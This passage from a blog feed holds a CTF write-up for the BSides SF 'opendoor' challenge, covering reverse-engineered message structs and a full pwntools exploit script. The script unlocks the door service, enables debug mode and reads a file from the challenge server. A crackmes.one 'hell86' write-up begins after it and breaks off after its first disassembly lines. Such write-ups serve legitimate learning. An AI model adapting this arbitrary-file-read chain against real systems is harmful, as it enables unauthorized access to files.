&lt;p&gt;Clearly, the first member variable must be non zero and the second member variable must equate to &lt;strong&gt;door_number&lt;/strong&gt;. The _good branch continues at&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/unlock_exec_2.png&#34; alt=&#34;unlock_exec_2&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;which unlocks the door and creates an &lt;strong&gt;UnlockResponse&lt;/strong&gt;. While the _bad branch, locks the door instead and returns an ACCESS_DENIED &lt;strong&gt;ErrorMessage&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Now we can represent &lt;strong&gt;Message&lt;/strong&gt; as&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; Message
    {
        int32_t id;
        int32_t time_stamp;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;union&lt;/span&gt; {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;union&lt;/span&gt; {
                UnlockMessage uMsg;
                DebugMessage dMsg;
                PingMessage pMsg;
            } msg;
            ErrorMessage eMsg;
        };
    };

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; UnlockMessage
    {
        int64_t do_unlock;
        int64_t door_no;
    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2-debugmessage&#34;&gt;2. DebugMessage&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;DebugRequestMessage::parse_message&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/debug_parse.png&#34; alt=&#34;debug_parse&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;It reads an Int32 which can be either 1 or 2. If the value read is 1, then it reads a boolean. If the value is 2, it reads a string. These are stored in member variables at offsets +8, +12, +16&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DebugRequestMessage::execute&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/debug_exec.png&#34; alt=&#34;debug_exec&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;If the member at offset +8 is 1 then **DebugRequestMessage::handle_debug_message_** is called. If the value is not 1 and the lock is not debuggable, an **ACCESS_DENIED** Error is returned. Whereas if the value is 2, and the lock is debuggable, **DebugRequestMessage::handle_readfile** is called.&lt;/p&gt;
&lt;p&gt;Thus the member at offset +8, denotes the &lt;em&gt;debug_type&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Yay ! This looks promising !&lt;/p&gt;
&lt;p&gt;So, to execute **handle_readfile_**, we must have the lock&amp;rsquo;s **DEBUG** flag turned on. But the lock&amp;rsquo;s debug flag is initially 0.&lt;/p&gt;
&lt;p&gt;**handle_debug_message_**:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/debug_handle_dbg.png&#34; alt=&#34;debug_handle_dbg&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;If the member at offset +12 is 1, the routine turns on the door&amp;rsquo;s &lt;strong&gt;DEBUG&lt;/strong&gt; flag if the door is unlocked. If the value at offset +12 is not 1, then the door&amp;rsquo;s debug flag is turned off.&lt;/p&gt;
&lt;p&gt;The member at offset +12 denotes the flag for turning on lock&amp;rsquo;s debug flag.&lt;/p&gt;
&lt;p&gt;**handle_readfile_** reads 4K bytes from the file whose path is stored in the member variable at offset +16 and returns the contents.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; DebugMessage
    {
        int32_t debug_type;
        int8_t b_debug_lock;
        std::string filePath;
    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;approach&#34;&gt;Approach&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Send &lt;strong&gt;UnlockMessage&lt;/strong&gt; to set the lock&amp;rsquo;s status to &lt;strong&gt;UNLOCKED&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Send &lt;strong&gt;DebugMessage&lt;/strong&gt; of type 1 to set the lock&amp;rsquo;s &lt;strong&gt;DEBUG&lt;/strong&gt; flag&lt;/li&gt;
&lt;li&gt;Send &lt;strong&gt;DebugMessage&lt;/strong&gt; of type 2 to read any file !!&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The &lt;strong&gt;ConnectionPool&lt;/strong&gt; class uses non-blocking IO. It maintains a map whose keys are the client socket descriptors and values are instances of &lt;strong&gt;ConnectionHandler&lt;/strong&gt;. The **do_read_** (**do_write**) methods read (write) a vector of bytes (from the socket) in the same format as **Buffer** reads (writes).&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s the vtable for &lt;strong&gt;ConnectionHandler&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/conn_handler_vtable.png&#34; alt=&#34;conn_handlr_vtbl&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The members of &lt;strong&gt;ConnectionHandler&lt;/strong&gt; are&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;namespace&lt;/span&gt; opendoor {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;ConnectionHandler&lt;/span&gt; {
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int32_t&lt;/span&gt; socket;                 &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* +0x8 */&lt;/span&gt;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;bool&lt;/span&gt; b_closed;                  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* +0xC */&lt;/span&gt;
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int32_t&lt;/span&gt; read_size;              &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* +0x10 */&lt;/span&gt;
            vector&amp;lt;byte&amp;gt; write_vec;         &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* +0x18 */&lt;/span&gt;
            vector&amp;lt;byte&amp;gt; read_vec;          &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* +0x30 */&lt;/span&gt;
            shared_ptr&amp;lt;Buffer&amp;gt; buffer;      &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* +0x48 */&lt;/span&gt;
            shared_ptr&amp;lt;State&amp;gt; lock;         &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* +0x58 */&lt;/span&gt;
            shared_ptr&amp;lt;Crypter&amp;gt; cryptr;     &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* +0x68 */&lt;/span&gt;
            &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        };
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s visit **ConnectionHandler::process_message_**&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/conn_proc.png&#34; alt=&#34;conn_proc&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The routine calls &lt;strong&gt;cryptr-&amp;gt;decrypt()&lt;/strong&gt; on &lt;strong&gt;buffer&lt;/strong&gt;. If the decryption is successful, it proceeds to &lt;strong&gt;ParseMessage&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/conn_proc_2.png&#34; alt=&#34;conn_proc_2&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;If the message has been parsed successfully, the &lt;strong&gt;execute()&lt;/strong&gt; method is invoked. If it succeeds, a positive response is returned by invoking &lt;strong&gt;serialize()&lt;/strong&gt; followed by &lt;strong&gt;cryptr-&amp;gt;encrypt()&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Last but not the least, &lt;strong&gt;init&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/init.png&#34; alt=&#34;init&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The second routine, sets up the &lt;strong&gt;map&lt;/strong&gt;s as follows&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    messages = {
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# opendoor::Message::{lambda(void)#i}::operator()&lt;/span&gt;
        &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;  : &lt;span style=&#34;color:#3677a9&#34;&gt;0x48900&lt;/span&gt;,    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# PingRequest&lt;/span&gt;
        &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;  : &lt;span style=&#34;color:#3677a9&#34;&gt;0x48940&lt;/span&gt;,    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# PingResponse&lt;/span&gt;
        &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;  : &lt;span style=&#34;color:#3677a9&#34;&gt;0x48980&lt;/span&gt;,    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# UnlockRequest&lt;/span&gt;
        &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;  : &lt;span style=&#34;color:#3677a9&#34;&gt;0x489C0&lt;/span&gt;,    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# UnlockResponse&lt;/span&gt;
        &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;  : &lt;span style=&#34;color:#3677a9&#34;&gt;0x48A00&lt;/span&gt;,    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# DebugRequest&lt;/span&gt;
        &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;  : &lt;span style=&#34;color:#3677a9&#34;&gt;0x48A40&lt;/span&gt;,    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# DebugResponse&lt;/span&gt;
        -&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt; : &lt;span style=&#34;color:#3677a9&#34;&gt;0x48A80&lt;/span&gt;     &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# ErrorMessage&lt;/span&gt;
    }

    error_messages = {
        &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;     : &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Unknown&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;     : &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Invalid Message Type&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;     : &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Invalid Timestamp&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;     : &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Error Parsing&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;     : &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Crypto Error&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x193&lt;/span&gt; : &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Access Denied&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#3677a9&#34;&gt;0x194&lt;/span&gt; : &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Resource Not Found&amp;#34;&lt;/span&gt;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;main&lt;/strong&gt; is also straightforward. It calls &lt;strong&gt;parse_flags&lt;/strong&gt; to determine the default &lt;strong&gt;Crypter&lt;/strong&gt; instance to be used. The default is &lt;strong&gt;AESCrypter&lt;/strong&gt;. If &lt;strong&gt;-n&lt;/strong&gt; is specified, &lt;strong&gt;PlainCrypter&lt;/strong&gt; is used. The default port is 4848 which can be changed with &lt;strong&gt;-p&lt;/strong&gt; option.&lt;/p&gt;
&lt;p&gt;So, we have to write the encrypted &lt;strong&gt;Message&lt;/strong&gt; prefixed by the size of the encrypted message to the server.&lt;/p&gt;
&lt;h2 id=&#34;source-code&#34;&gt;Source Code&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#!/usr/bin/python&lt;/span&gt;

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;Crypto.Cipher&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;import&lt;/span&gt; AES
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#447fcf;text-decoration:underline&#34;&gt;pwn&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;import&lt;/span&gt; *

    PLAINTEXT = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pad&lt;/span&gt;(m):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; m+&lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;-&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(m)%&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;)*(&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;-&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(m)%&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;)

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;unpad&lt;/span&gt;(s):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; s[:-&lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(s[&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(s)-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;:])]

    door_number = &lt;span style=&#34;color:#3677a9&#34;&gt;0x55AA55AA5A5AA5A5&lt;/span&gt;
    key = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x97\x8B\x8B\x8F\x8C\xC5\xD0\xD0\x88\x88\x88\xD1\x8C\x86\x8C\x8B\x9A\x92\x90\x89\x9A\x8D\x93\x90\x8D\x9B\xD1\x9C\x90\x92\xD0\xFF&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&lt;/span&gt;
    iv = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;notaflagnotaflag&amp;#39;&lt;/span&gt;

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;encrypt&lt;/span&gt;(msg):
        aes = AES.new(key=key, IV=iv, mode=AES.MODE_CBC)
        ans = aes.encrypt(pad(msg))
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;del&lt;/span&gt; aes
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; ans

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;decrypt&lt;/span&gt;(msg):
        aes = AES.new(key=key, IV=iv, mode=AES.MODE_CBC)
        ans = aes.decrypt(msg)
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;del&lt;/span&gt; aes
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; unpad(ans)

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;i32&lt;/span&gt;(i):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; p32(i, endian=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;i64&lt;/span&gt;(i):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; p64(i, endian=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pStr&lt;/span&gt;(s):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; i32(&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(s)) + s

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;debugReq1&lt;/span&gt;(f):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; i32(&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) + &lt;span style=&#34;color:#24909d&#34;&gt;chr&lt;/span&gt;(f)

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;debugReq2&lt;/span&gt;(f):
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; i32(&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;) + pStr(f)

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;unlockReq&lt;/span&gt;():
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; i64(&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) + i64(door_number)

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;msg&lt;/span&gt;(msg_id, oMsg):
        body = i32(msg_id) + i32(&lt;span style=&#34;color:#24909d&#34;&gt;int&lt;/span&gt;(time.time()+&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;)) + oMsg
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;not&lt;/span&gt; PLAINTEXT:
            body = encrypt(body)
        m = i32(&lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(body)) + body
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; m

    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;parse&lt;/span&gt;(msg):
        size = u32(msg[:&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;], endian=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Message size: &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt; bytes&amp;#34;&lt;/span&gt; % size
        msg = msg[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;:&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;+size]
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;not&lt;/span&gt; PLAINTEXT:
            msg = decrypt(msg)
        msg_id = u32(msg[:&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;], endian=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Message ID: &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt; % msg_id
        time_stamp = u32(msg[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;:&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;], endian=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[*] Timestamp: &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt; % time_stamp
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; msg_id == &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;:
            uflag = u64(msg[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;:&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;], endian=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
            door = u64(msg[&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;:&lt;span style=&#34;color:#3677a9&#34;&gt;24&lt;/span&gt;], endian=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[ Unlock ] - [ unlock_flag : &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;, door_num : &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%x&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt; ]&amp;#34;&lt;/span&gt; % (uflag, door)
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;elif&lt;/span&gt; msg_id == &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;:
            debug_option = u32(msg[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;:&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;], endian=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; debug_option == &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;:
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[ Debug ] - [ debug_flag : &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt; ]&amp;#34;&lt;/span&gt; % &lt;span style=&#34;color:#24909d&#34;&gt;ord&lt;/span&gt;(msg[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;])
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;else&lt;/span&gt;:
                size = u32(msg[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;:&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;], endian=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
                text = msg[&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;:&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;+size]
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[ Debug ] - [ text : &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39; ]&amp;#34;&lt;/span&gt; % text


    r = remote(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;opendoor-ea62dae9.challenges.bsidessf.net&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;4141&lt;/span&gt;)

    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# unlock request to set unlock flag&lt;/span&gt;
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# send debug request with debug flag on to debug&lt;/span&gt;
    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# send debug request to read any file&lt;/span&gt;

    r.send(msg(&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;, unlockReq()))
    parse(r.recv())
    r.send(msg(&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;, debugReq1(&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;)))
    parse(r.recv())
    r.send(msg(&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;, debugReq2(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;/home/opendoor/flag.txt&amp;#39;&lt;/span&gt;)))
    parse(r.recv())
    r.close()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And the Output &amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/images/bsides/output.png&#34; alt=&#34;output&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Solved after the CTF was over :(
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>crackmes.one - hell86</title>
        <link>http://localhost:1313/post/crackmes.one-hell86/</link>
        <pubDate>Sun, 13 Jan 2019 00:00:00 +0530</pubDate>
        
        <guid>http://localhost:1313/post/crackmes.one-hell86/</guid>
        <description>&lt;p&gt;This is a beautiful challenge by ttlhacker from &lt;a class=&#34;link&#34; href=&#34;https://crackmes.one&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;crackmes.one&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id=&#34;description&#34;&gt;Description&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;x86_64 linux binary (tested on debian 9 and ubuntu 18.04, should run on any distro). Takes one command line argument and outputs &amp;ldquo;OK!&amp;rdquo; if it&amp;rsquo;s correct, &amp;ldquo;Wrong&amp;rdquo; if it&amp;rsquo;s not.&lt;br&gt;
Partially written in C, actual verification routine is assembly.&lt;br&gt;
Don&amp;rsquo;t patch the binary, of course - find the correct input.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s get started :-)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    ╭ (fcn) main 110
    │   int main (int argc, char **argv, char **envp);
    │           ; arg int argc @ rdi
    │           ; arg char **argv @ rsi
    │           ; DATA XREF from entry0 (0x107d)
    │           0x00000fc0      55             push rbp
    │           0x00000fc1      53             push rbx
    │           0x00000fc2      4889f5         mov rbp, rsi                ; argv
    │           0x00000fc5      89fb           mov ebx, edi                ; argc
    │           0x00000fc7      4883ec08       sub rsp, 8
    │           0x00000fcb      e8f6090000     call make_alt_stack
    │           0x00000fd0      84c0           test al, al
